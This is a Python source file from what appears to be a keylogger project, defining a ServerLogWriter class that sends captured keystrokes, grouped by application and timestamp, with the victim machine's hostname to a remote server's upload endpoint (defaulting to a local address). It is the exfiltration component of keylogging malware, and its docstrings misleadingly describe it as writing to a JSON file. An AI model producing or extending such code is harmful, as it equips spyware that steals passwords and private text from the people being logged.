import socket
import requests

from keylogger.interfaces import ILogWriter


class ServerLogWriter(ILogWriter):
    """
    Writes logs to a json file in a structured format.

    This class appends new log entries with timestamps and organizes them per application in the json format.
    """

    def __init__(self, server_url="http://127.0.0.1:5000"):
        """Initializes the log writer and ensures the log file exists."""
        self.server_url = server_url
        self.machine_name = socket.gethostname()  # Get the machine name

    def write_log(self, log: dict) -> None:
        """
        Writes the log data to the file in a structured format.

        Args:
            log (dict): A dictionary containing captured keystrokes organized by application and timestamps.
        """
        if not log:
            return  # No log to write

        data = {
            "machine": self.machine_name,
            "data": log
        }

        try:
            response = requests.post(f"{self.server_url}/api/upload", json=data)
            response.raise_for_status()
            print(f"log sent successfully: {response.json()}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send log data: {e}")
